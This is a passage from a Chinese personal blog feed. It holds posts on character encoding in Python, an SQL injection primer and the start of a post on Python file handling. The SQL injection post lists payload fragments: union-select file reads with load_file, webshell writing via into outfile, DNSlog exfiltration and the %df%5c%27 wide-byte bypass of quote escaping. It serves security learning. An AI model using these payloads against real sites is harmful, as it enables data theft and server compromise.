start="0"><li><p>固定一个字符对应2Bytes，部分生僻字用4个Bytes</p></li><li><p>存在所有语言中的所有字符与数字的一 一对应关系，即兼容万国字符。</p></li><li><p>与传统的字符编码的二进制数都有对应关系，详解如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">很多地方或老的系统、应用软件仍会采用各种各样传统的编码，这是历史遗留问题。此处需要强调：软件是存放于硬盘的，而运行软件是要将软件加载到内存的，面对硬盘中存放的各种传统编码的软件，想让我们的计算机能够将它们全都正常运行而不出现乱码，内存中必须有一种兼容万国的编码，并且该编码需要与其他编码有相对应的映射/转换关系，这就是unicode的第二大特点产生的缘由。</span><br></pre></td></tr></table></figure></li></ol><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b97f229cf8222a6e908a7bb628fb95b0.png" alt="image-20200807115452997"></p><p>比如这个“上”字符，他的unicode对应的数字（4E0A，这里是16进制显示的），不但对应这个上，还对应这</p><p>G0-494F，J0-3E45等，也就是unicode第二个特点与传统二进制数也有对应关系。</p><p>文本编辑器输入任何字符都是最新存在于内存中，是unicode编码的，存放于硬盘中，则可以转换成任意其他编</p><p>码，只要该编码可以支持相应的字符。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/8f01b4996a5f037152e912a0684c3915.png" alt="image-20200807114317673"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 英文字符可以被ASCII识别</span></span><br><span class="line">英文字符---&gt;unciode格式的数字---&gt;ASCII格式的数字</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中文字符、英文字符可以被GBK识别</span></span><br><span class="line">中文字符、英文字符---&gt;unicode格式的数字---&gt;gbk格式的数字</span><br><span class="line"></span><br><span class="line"><span class="comment"># 日文字符、英文字符可以被shift-JIS识别</span></span><br><span class="line">日文字符、英文字符---&gt;unicode格式的数字---&gt;shift-JIS格式的数字</span><br></pre></td></tr></table></figure><p>目前所有多的电脑在内存中字符的编码都是unicode，且不能修改，这一点保证了你可以在电脑上输入任何国家的</p><p>字符和你可以打开以前老编码的文本文件，因为他们也和unicode有对应关系，也能反解成对应的字符显示在屏幕</p><p>上。</p><p>这个时候已经可以在自己的计算机上输入万国的字符了，但是如果你存到硬盘上也采用unicode格式的话，如果绝</p><p>大多数字符都是英文字符的话就会造成一种空间的浪费，相对于以前的一个英文字符对应一个Bytes也是一种倒退</p><p>虽然说现在存储已经不值钱了，但是当我们写进硬盘时，数据量大的一定比小的带来的IO延迟要高，甚至当我们</p><p>由内存写入硬盘时会额外耗费一倍的时间。所以这才是用unicode编码的文件不能直接丢到硬盘的原因。所以将内</p><p>存中的unicode二进制写入硬盘或者基于网络传输时必须将其转换成一种精简的格式，这种格式即utf-8。</p><h2 id="4、-UTF-8"><a href="#4、-UTF-8" class="headerlink" title="4、 UTF-8"></a>4、 UTF-8</h2><blockquote><p>utf-8 全称Unicode Transformation Format，即unicode的转换格式</p></blockquote><p>由于unicode的不完美，于是又出现了一种新的字符编码，就是UTF-8，实质上还是unicode，只不过在中英文字</p><p>符上做上了区分。这样就完美的解决了unicode带来的存储问题。</p><ol><li>英文字符对应一个Bytes  一个字节是8位  0000 1000</li><li>中文字符对应3个Bytes</li></ol><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e33f91398db8f8342791c3bd6a3ba5ac.png" alt="image-20200809100812010"></p><p><strong>那为何在内存中不直接使用utf-8呢？</strong></p><p>utf-8是针对Unicode的可变长度字符编码：一个英文字符占1Bytes，一个中文字符占3Bytes，生僻字用更多的</p><p>Bytes存储。</p><p>unicode更像是一个过渡版本与之前老的编码格式有这对应关系，我们新开发的软件或文件存入硬盘都采用utf-8</p><p>格式，等过去几十年，所有老编码的文件都淘汰掉之后，会出现一个令人开心的场景，即硬盘里放的都是utf-8格</p><p>式，此时unicode便可以退出历史舞台，内存里也改用utf-8，天下重新归于统一。</p><h2 id="5、编码和解码"><a href="#5、编码和解码" class="headerlink" title="5、编码和解码"></a>5、编码和解码</h2><p>由字符转换成内存中的unicode，以及由unicode转换成其他编码的过程，都称为编码encode</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/15ba2a0f341fafbe43a5a3915c350b3d.png" alt="image-20200809101630703"></p><p>由内存中的unicode转换成字符，以及由其他编码转换成unicode的过程，都称为解码decode</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/71fc448ceb01f8a67ae2dc28078cd92f.png" alt="image-20200809101648748"></p><p>在诸多文件类型中，只有文本文件的内存是由字符组成的，因而文本文件的存取也涉及到字符编码的问题</p><h1 id="四、字符编码的应用"><a href="#四、字符编码的应用" class="headerlink" title="四、字符编码的应用"></a>四、字符编码的应用</h1><p>通过上面上面的知识我们已经对字符编码的理论知识学习完毕了。知道了内存中固定使用unicode无论输入任何字</p><p>符都不会发生乱码。我们能够修改的是存&#x2F;取硬盘的编码方式，如果编码设置不正确将会出现乱码问题。乱码问题</p><p>分为两种：</p><p>&#x3D;&#x3D;存乱了&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">就是你输入的字符和你即将存到硬盘所采用的编码方式没有对应关系.</span><br><span class="line">比如: 你输入的是日文,但是你保存文件的时候选择GBK,那么计算机就没有办法通过日文对应的unicode码</span><br><span class="line">     再转换成gbk格式的二进制数字存到硬盘中.因为gbk只和英文字符和中文字符有对应关系.</span><br><span class="line">     这个时候计算机不知道怎么办了,就随便对应就会出现乱码.</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;读乱了&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">就是当你用一个文本编辑软件打开一个文本文件时,原本存放的文件的编码如果是gbk格式的二进制,但是你要</span><br><span class="line">用Shift_JIS打开的话,对应的二进制数字是没有对应的字符的,这个时候计算机不知道怎么办了,就随便对应就会出现乱码.</span><br></pre></td></tr></table></figure><p>读乱了还好，至少数据是不会丢失的，但是如果你是存乱了，那你原本数据就没办法恢复了。</p><p>&#x3D;&#x3D;总结&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. 保证存的时候不乱：在由内存写入硬盘时，必须将编码格式设置为支持所输入字符的编码格式</span></span><br><span class="line"><span class="comment">#2. 保证读的时候不乱：在由硬盘读入内存时，必须采用与写入硬盘时相同的编码格式</span></span><br></pre></td></tr></table></figure><h2 id="1、-文本编辑器nodpad-存取文本文件"><a href="#1、-文本编辑器nodpad-存取文本文件" class="headerlink" title="1、 文本编辑器nodpad++存取文本文件"></a>1、 文本编辑器nodpad++存取文本文件</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/9f47457c5488a8ba8d02ff460d05dc24.png" alt="image-20200809104325825"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/94583abb82953e3a4be5209e4f151462.png" alt="image-20200809104303347"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/70809c66ca5502a1cc326b056ca7266f.png" alt="image-20200809104341670"></p><p>发现选择日文编码就能正常显示了。</p><h2 id="2、-python程序运行不乱码"><a href="#2、-python程序运行不乱码" class="headerlink" title="2、 python程序运行不乱码"></a>2、 python程序运行不乱码</h2><p>首先在你运行python程序的前提是，你的python程序已经开发好了。然后拿着程序交给python解释器进行运行</p><p>我们知道python程序就相当于文本文件，python解释器就相当于文本编辑器。那么当它读取文件时，肯定有自己</p><p>的默认编码。</p><p>&#x3D;&#x3D;python3读取文件的默认编码：utf-8&#x3D;&#x3D;</p><p>&#x3D;&#x3D;python2读取文件的默认编码：ASCII&#x3D;&#x3D;</p><p>但是如果我们的程序的源文件的编码是gbk，无论是用python2执行，还是python3执行都会出现读取乱码。</p><p>这一点开发人员早已想到，可以指定文件头修改默认的编码。在首行添加<code># coding:gbk（文件保存的编码）</code>，</p><p>告诉解释器不要用你的默认编码读文件了，用我指定的就行了。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b8bf4315266c23c3250e53b005baa6c0.png" alt="image-20200810111140441"></p><p><strong>那么首行的字符是以什么编码读取的呢?</strong></p><p>没错就是python解释器的默认编码，因为首行全是英文字符，无论哪种编码都能保证读取出来。</p><p><strong>保证python程序前两个阶段不乱码的核心法则：</strong></p><p>指定文件头，<code># coding:文件当初存入硬盘时所采用的编码格式</code></p><p>python3的str类型在内存中默认直接存成unicode格式，无论如何都不会乱码。但是python2不是，因为</p><p>python1989年诞生，但是unicode1990年才开始推行。所以你懂的。要想保证python2的str类型不乱码</p><p>在字符串前+u，例如：<code>x = u&quot;大帅比&quot;</code>，强制告诉python2解释器用unicode格式存。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">内存的编码使用unicode，不代表内存中全都是unicode，</span><br><span class="line"></span><br><span class="line">在程序执行之前，内存中确实都是unicode,比如从文件中读取了一行x=<span class="string">&quot;ymn&quot;</span>,其中的x，等号，引号，地位都一样，都是普通字符而已，都是以unicode的格式存放于内存中的</span><br><span class="line"></span><br><span class="line">但是程序在执行过程中，会申请内存（与程序代码所存在的内存是俩个空间）用来存放python的数据类型的值，而python的字符串类型又涉及到了字符的概念</span><br><span class="line"></span><br><span class="line">比如x=<span class="string">&quot;ymn&quot;</span>,会被python解释器识别为字符串，会申请内存空间来存放字符串类型的值，至于该字符串类型的值被识别成何种编码存放，这就与python解释器的有关了，而python2与python3的字符串类型又有所不同。</span><br></pre></td></tr></table></figure><h1 id="五、-补充"><a href="#五、-补充" class="headerlink" title="五、 补充"></a>五、 补充</h1><h2 id="1、-python2的两种字符串类型"><a href="#1、-python2的两种字符串类型" class="headerlink" title="1、 python2的两种字符串类型"></a>1、 python2的两种字符串类型</h2><p>python2解释器有两种字符串类型：str，unicode</p><h3 id="（1）str"><a href="#（1）str" class="headerlink" title="（1）str"></a>（1）str</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:gbk</span></span><br><span class="line">x = <span class="string">&quot;上&quot;</span></span><br><span class="line"><span class="built_in">print</span>([x]) <span class="comment">#[&#x27;\xc9\xcf&#x27;]</span></span><br><span class="line"><span class="comment">#\x代表16进制，此处是c9cf总共4位16进制数，一个16进制是4个比特位，</span></span><br><span class="line"><span class="comment">#4个16进制数则是16个比特位，即2个Bytes，这就证明了按照gbk编码中文用2Bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串值会按照文件头指定的编码格式存入变量值的内存空间</span></span><br><span class="line"><span class="comment"># 不指定就是默认的编码格式(ASCII)</span></span><br></pre></td></tr></table></figure><p><strong>gbk存中文需要2个bytes，而存英文则需要1个bytes，它是如何做到的？？？！！！</strong></p><p>gbk会在每个bytes，即8位bit的第一个位作为标志位，标志位为1则表示是中文字符，如果标志位为0则表示为英</p><p>文字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=‘你a好’</span><br><span class="line">转成gbk格式二进制位</span><br><span class="line">8bit+8bit+8bit+8bit+8bit=(<span class="number">1</span>+7bit)+(<span class="number">1</span>+7bit)+(<span class="number">0</span>+7bit)+(<span class="number">1</span>+7bit)+(<span class="number">1</span>+7bit)</span><br></pre></td></tr></table></figure><p>这样计算机按照从左往右的顺序读：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#连续读到前两个括号内的首位标志位均为1，则构成一个中午字符：你</span><br><span class="line"></span><br><span class="line">#读到第三个括号的首位标志为0，则该8bit代表一个英文字符：a</span><br><span class="line"></span><br><span class="line">#连续读到后两个括号内的首位标志位均为1，则构成一个中午字符：好</span><br></pre></td></tr></table></figure><p>也就是说，每个Bytes留给我们用来存真正值的有效位数只有7位，而在unicode表中存放的只是这有效的7位，至</p><p>于首位的标志位与具体的编码有关，即在unicode中表示gbk的方式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(7bit)+(7bit)+(7bit)+(7bit)+(7bit)</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/9df929ee7b19139a60ef07d04dc8e4b9.png" alt="img"> </p><p>按照上图翻译的结果，我们可以去unicode关于汉字的对应关系中去查：<a href="https://pan.baidu.com/s/1dEV3RYp">链接：https://pan.baidu.com/s/1dEV3RYp</a></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c57534b4622b2ff988af4d55f30e3e93.png" alt="img"></p><p>可以看到“”上“”对应的gbk（G0代表的是gbk）编码就为494F，即我们得出的结果，而上对应的unicode编码为4E0A，我们可以将gbk–&gt;decode–&gt;unicode</p><h3 id="（2）unicode"><a href="#（2）unicode" class="headerlink" title="（2）unicode"></a>（2）unicode</h3><p>当python解释器执行到产生字符串的代码时（例如s&#x3D;u’袁’），会申请新的内存地址，然后将’袁’以unicode的格</p><p>式存放到新的内存空间中，所以s只能encode，不能decode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">x = <span class="string">u&quot;上&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制存成unicode</span></span><br></pre></td></tr></table></figure><h2 id="2、-打印到终端"><a href="#2、-打印到终端" class="headerlink" title="2、 打印到终端"></a>2、 打印到终端</h2><p>对于print需要特别说明的是：</p><p>当程序执行时，比如<code>x=&#39;上&#39;</code> #gbk下，字符串存放为<code>\xc9\xcf</code></p><p>print(x) #这一步是将x指向的那块新的内存空间（非代码所在的内存空间）中的内容，打印到终端，按理说应该是</p><p>存的什么就打印什么,但打印\xc9\xcf，对一些不熟知python编码的程序员，立马就懵逼了，所以龟叔自作主张，</p><p>在<code>print(x)</code>时，&#x3D;&#x3D;使用终端的编码格式&#x3D;&#x3D;，将内存中的\xc9\xcf转成字符显示，此时就需要终端编码必须为gbk，</p><p>否则无法正常显示原内容：上</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/6e110473080d2f1c965fee03282bae29.png" alt="img"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/96926060293a525322bd5e5a953a7071.png" alt="img"></p><p><strong>对于unicode格式的数据来说，无论怎么打印，都不会乱码</strong></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1b31fb860f40f72d6833817857f7dc96.png" alt="img"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/186c7c992a1fdb9ab466176e633f014a.png" alt="img"></p><p><strong>unicode这么好，不会乱码，那python2为何还那么别扭，搞一个str出来呢？python诞生之时，unicode并未像今天这样普及，很明显，好的东西你能看得见，龟叔早就看见了，龟叔在python3中将str直接存成unicode，我们定义一个str，无需加u前缀，就是一个unicode，屌不屌？</strong></p><h2 id="3、python3的两种字符串类型"><a href="#3、python3的两种字符串类型" class="headerlink" title="3、python3的两种字符串类型"></a>3、python3的两种字符串类型</h2><p>&#x3D;&#x3D;str是unicode&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:gbk</span></span><br><span class="line">x=<span class="string">&#x27;上&#x27;</span> <span class="comment">#当程序执行时，无需加u，&#x27;上&#x27;也会被以unicode形式保存新的内存空间中,</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x)) <span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#x可以直接encode成任意编码格式</span></span><br><span class="line"><span class="built_in">print</span>(x.encode(<span class="string">&#x27;gbk&#x27;</span>)) <span class="comment">#b&#x27;\xc9\xcf&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x.encode(<span class="string">&#x27;gbk&#x27;</span>))) <span class="comment">#&lt;class &#x27;bytes&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>很重要的一点是：看到python3中<code>x.encode(&#39;gbk&#39;)</code> 的结果<code>\xc9\xcf</code>正是python2中的str类型的值,而在</p><p>python3是bytes类型，在python2中则是str类型于是我有一个大胆的推测：python2中的str类型就是python3的</p><p>bytes类型，于是我查看<code>python2的str()</code>源码，发现</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/280ac724e26728d8231c29d02838d393.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入的博弈</title>
      <link href="/2022/06/01/sql_study/"/>
      <url>/2022/06/01/sql_study/</url>
      
        <content type="html"><![CDATA[<h1 id="一、SQL注入介绍"><a href="#一、SQL注入介绍" class="headerlink" title="一、SQL注入介绍"></a>一、SQL注入介绍</h1><h2 id="1、SQL注入简介"><a href="#1、SQL注入简介" class="headerlink" title="1、SQL注入简介"></a>1、SQL注入简介</h2><p>SQL注入是指web应用程序对用户输入数据的合法性来进行判断、处理，前端传入的参数是攻击者可控的，并且参数被正常的带入到数据库查询，攻击者可以通过构造不同的SQL语句来进行对数据库的操作，正常情况下，攻击者可以对数据库进行高危操作，例如，数据查询、WebShell写入、命令执行等操作。<br>&#x3D;&#x3D;注意：SQL注入需要有SQL语言的基础，SQL语言基础后续会发布文章，实际操作会发布在sql-lib文章中。&#x3D;&#x3D;<br>##2、SQL注入原理<br>SQL注入漏洞的产生需要满足以下两个条件：</p><blockquote><ol><li><p>参数是用户可控的，也就是前端传入后端的参数的内容是用户可以控制的。</p></li><li><p>参数被带入数据库进行查询，也就是传入的参数被拼接到SQL语句中，并且带入到数据库进行查询。</p></li></ol></blockquote><h2 id="3、注入判断"><a href="#3、注入判断" class="headerlink" title="3、注入判断"></a>3、注入判断</h2><p>当传入的参数为1’时，数据库会执行以下代码并会报错，这是因为不符合数据库语法规范的。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2a4ecce5c9734b4e85d77edcaa5bff64.png" alt="在这里插入图片描述"><br>当传入的参数为and1&#x3D;1时，不会报错，因为1&#x3D;1为真，所以返回的页面是正常的，当传入参数为and1&#x3D;2时，因为条件为假，所以会返回一个不同的结果。<br>注意：回显是指页面有数据，信息返回，无回显是指根据输入的语句页面没有任何变化，或者没有数据库中的内容显示到网页中。<br>##4、SQL注入流程<br>判断是否存在注入并且判断注入类型</p><ol><li>判断字段数order by</li><li>确定回显点union select 1,2</li><li>查询数据库信息@@version @@datadir</li><li>查询用户名，数据库名 user（） database（）</li><li>文件读取union select 1,load_file(‘C:\windows\win.ini’)#</li><li>写入webshell    select .. into outfile …<br>&#x3D;&#x3D;如果使用sql注入时遇到转义字符串的单引号或者双引号，可以使用HEX编码绕过。&#x3D;&#x3D;</li></ol><h2 id="5、SQL注入的危害"><a href="#5、SQL注入的危害" class="headerlink" title="5、SQL注入的危害"></a>5、SQL注入的危害</h2><ol><li>数据库信息泄露：泄露数据库中存放的数据，用户隐私等。</li><li>获取webshell：当权限为root且知道绝对路径时，可以直接写入一句话木马到服务器。</li><li>网页篡改：注入出后台管理员用户，登录后台发布恶意数据，篡改后台数据。</li><li>网站挂马：当拿到webshell或者获取到服务器权限后，可以将一些网页木马挂在服务器上，去攻击。</li><li>获取系统权限：当权限足够高，可以获取系统主机的权限。</li><li>万能密码：利用特定的payload登录后台或其它页面。</li><li>文件读取：读取敏感信息。</li></ol><h1 id="二、SQL注入类型"><a href="#二、SQL注入类型" class="headerlink" title="二、SQL注入类型"></a>二、SQL注入类型</h1><h2 id="1、简单分类"><a href="#1、简单分类" class="headerlink" title="1、简单分类"></a>1、简单分类</h2><blockquote><ol><li>安装数据库类型分类  Access、MsSQL、MySQL、Oracle、DB2等</li><li>按照提交方式分类  GET、POST、cookie、HTTP头、XFF</li><li>按注入点类型分类  数字型、字符型、搜索型</li><li>按执行效果分类  布尔盲注、时间盲注、报错注入、联合注入、堆叠查询注入</li></ol></blockquote><h2 id="2、数字型注入"><a href="#2、数字型注入" class="headerlink" title="2、数字型注入"></a>2、数字型注入</h2><p>在web端大概是<a href="http://xxx.com/news.php?id=1">http://xxx.com/news.php?id=1</a> 这种形式，其注入点ID类型为数字，所以叫数字型注入点。这一类的SQL语句原型大概为select * from 表名 where id&#x3D;1。<br>&#x3D;&#x3D;简单来说就是最直白简单的一种注入方式。&#x3D;&#x3D;<br>##3、字符型注入<br>在web端大概是<a href="http://xxx.com/new.php?name=admin">http://xxx.com/new.php?name=admin</a> 这种形式，其注入点name类型为字符类型，所以叫字符型注入点。这一类的SQL语句原型大概为select * from 表名 where name&#x3D; ‘admin’ 。<br>##4、搜索型注入<br>一些网站为了方便用户查找网站的资源，都对用户提供了搜索功能，因为是搜索功能，往往是程序员在编写代码都忽略了对其变量（参数）的过滤，而且这样的漏洞在国内的系统中普遍存在。<br>&#x3D;&#x3D;可以在皮卡皮卡网站进行练习。&#x3D;&#x3D;<br>##5、布尔盲注<br>即可以根据返回页面判断条件真假的注入。<br>&#x3D;&#x3D;关键在于if（a，b，c），如果a为真，返回b，否则返回c。&#x3D;&#x3D;<br>##6、时间（延时）盲注<br>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>&#x3D;&#x3D;关键也在于if（a，b，c）,但在这里，b一般为sleep（5），也就是说，a为真，则延迟五秒返回，否则马上返回。&#x3D;&#x3D;</p><h2 id="7、报错注入"><a href="#7、报错注入" class="headerlink" title="7、报错注入"></a>7、报错注入</h2><p>即页面会返回错误信息，或者把注入的语句结果直接返回在页面中。<br>&#x3D;&#x3D;有三个函数，extractvalue注入，updatexml注入，floor注入。&#x3D;&#x3D;<br>##8、二次注入<br>&#x3D;&#x3D;原理是在第一次查询中，将我们后面所需的内容插入进去，在第二次注入的过程中用到他，实现我们的目的。&#x3D;&#x3D;<br>##9、联合注入<br>可以使用union的情况下注入。<br>&#x3D;&#x3D;union可以用于很多注入方式中。&#x3D;&#x3D;<br>##10、堆叠查询注入<br>可以同时执行多条语句的执行时的注入。<br>&#x3D;&#x3D;具体请见实操，实操文章发布后会在此链接。&#x3D;&#x3D;<br>##11、Cookie注入<br>&#x3D;&#x3D;具体请见实操，实操文章发布后会在此链接。&#x3D;&#x3D;<br>##12、Referer注入<br>&#x3D;&#x3D;具体请见实操，实操文章发布后会在此链接。&#x3D;&#x3D;<br>##13、DNS外带<br>在实际的应用场景中，我们一般在进行SQL盲注时，为了效率，在load_file()函数未被禁用的情况下，我们可以结合一些dnslog平台，进行外带注入。<br>不管是布尔类型盲注还是时间盲注，都需要发送大量的数据包去判断数据，而这很可能会触发WAF的防护，因此导致IP被封，所以，如果条件允许，我们可以结合DNslog来快速的回显数据。MySQL数据库，通过DNSlog盲注需要用到load_file（）函数，该函数不仅能加载本地文件，同时也能对URL发起请求，因此需要使用load_file（）函数，需要root权限，并且secure_file_priv需要为空。<br>&#x3D;&#x3D;注意：利用原理是将dnslog平台中的特有字段payload代入目标发起dns请求，通过dns解析将请求后的关键信息组合成新的三级域名带出，在dns服务器的dns日志中显示出来。&#x3D;&#x3D;<br>##14、窄字节和宽字节<br>#####1、宽字节介绍</p><ol><li>当某个字符的大小为一个字节时，称其字符为窄字节</li><li>当某字符的大小为两个字节时，称其字符为宽字节</li><li>所有英文默认占一个字节，汉字占两个字节</li><li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,SHIFT_JIS</li></ol><h5 id="2、宽字节注入原理"><a href="#2、宽字节注入原理" class="headerlink" title="2、宽字节注入原理"></a>2、宽字节注入原理</h5><ol><li>程序员为了防止sql注入，对用户输入中的单引号（’）进行处理，在单引号前加上斜杠进行转义，这样被处理后的sql语句中，单引号不再具有作用，仅仅是内容而已。</li><li>而安全人员要绕过这个转义处理，使单引号发挥作用，有两个思路：&#x3D;&#x3D;1、让斜杠失去作用。2、让斜杠消失。&#x3D;&#x3D;</li><li>思路一：借鉴程序员的防范思路，对斜杠进行转义，使其失去转义单引号的作用，成为内容</li><li>思路二：宽字节注入。当使用MySQL使用宽字节编码，如GBK时，两个连在一起的字符会被认为是汉字，我们可以在单引号前加一个字符，使其和斜杠组合被认成汉字，从而达到让斜杠消失的目的，进而使单引号发挥作用。&#x3D;&#x3D;注意：前一个字符的Ascii要大于128，两个字符才能组合成汉字，如%df%5c%27，此时%df和%5c会被GBK认为是一个汉字，也就是繁体字運，而后面的%27也就是单引号（’），这样就绕过了闭合问题。<br>&#x3D;&#x3D;具体请见实操，实操文章发布后会在此链接。&#x3D;&#x3D;</li></ol><h1 id="三、总结与心得"><a href="#三、总结与心得" class="headerlink" title="三、总结与心得"></a>三、总结与心得</h1><p>SQL注入虽然分为了很多种类型，但他们的存在是平级关系，并不存在哪种注入优先级高，只能说具体问题具体分析，针对不同的网站，可能会有多种方式适用，所以碰吧，时间+努力&#x3D;幸运。<br>&#x3D;&#x3D;具体请见实操，实操文章发布后会在此链接。&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（九）</title>
      <link href="/2022/05/24/python_nine/"/>
      <url>/2022/05/24/python_nine/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403135921236.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python文件操作的知识。&#x3D;&#x3D;</p><h1 id="一、学前三问"><a href="#一、学前三问" class="headerlink" title="一、学前三问"></a>一、学前三问</h1><h2 id="1、什么是文件？"><a href="#1、什么是文件？" class="headerlink" title="1、什么是文件？"></a>1、什么是文件？</h2><p>文件是操作系统提供给用户&#x2F;应用程序操作硬盘的一种虚拟的概念&#x2F;接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户/应用程序</span><br><span class="line">操作系统(文件)  操作系统会把对用户/应用程序文件功能的调用转成具体的硬盘操作</span><br><span class="line">计算机硬件(硬盘)</span><br></pre></td></tr></table></figure><h2 id="2、为何要用文件"><a href="#2、为何要用文件" class="headerlink" title="2、为何要用文件"></a>2、为何要用文件</h2><p>用户&#x2F;应用程序可以通过文件将数据永久保存的硬盘中，即操作文件就是操作硬盘。<br>用户&#x2F;应用程序直接操作的是文件，对文件进行的所有操作，都是在向操作系统发送系统调用，然后再由操作将其转换成具体的硬盘操作。<br>##3、如何用文件：open（）<br>###（1）控制文件读写内容的模式：t和b<br>强调：t和b不能单独使用，必须和r&#x2F;w&#x2F;a连用，默认就是t，t代表text，通常不写后面的话，只有一个光秃秃的r w a这种实际上指的就是rt wt at<br>t文本（默认的模式）<br>1、读写都以str（unicode）为单位<br>2、文本文件<br>3、必须指定encoding&#x3D;’utf-8‘<br>b二进制&#x2F;bytes<br>一般是一些音频文件或者视频文件<br>###（2）控制文件读写操作的模式<br>r 只读模式<br>w 只写模式<br>a 只追加写模式<br>+：r+，w+，a+ 在原来模式的基础上只读的变可读可写，可写的变可写可读<br>#二、文件操作的基本流程<br>##1、打开文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&quot;文件路径&quot;</span>)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;C:\a\b\c\d.txt&quot;</span>)  <span class="comment"># 但是\(右斜杠)在字符串中转义的作用</span></span><br><span class="line">                        <span class="comment"># 如果文件夹叫nb,那写成路径\nb在字符串中就是换行符的意思了</span></span><br></pre></td></tr></table></figure><h3 id="（1）如何取消转移"><a href="#（1）如何取消转移" class="headerlink" title="（1）如何取消转移"></a>（1）如何取消转移</h3><p>字符串前+r<br>用左斜杠代替右斜杠，open功能自动会把左斜杠替换成右斜杠<br>###（2）路径分隔符<br>win下默认的路径分隔符是右斜杠<br>linux下默认的路径分隔符是左斜杠<br>###（3）绝对路径和相对路径<br>&#x3D;&#x3D;绝对路径&#x3D;&#x3D;就是文件的全部路径，从开始的盘符一直写到该文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 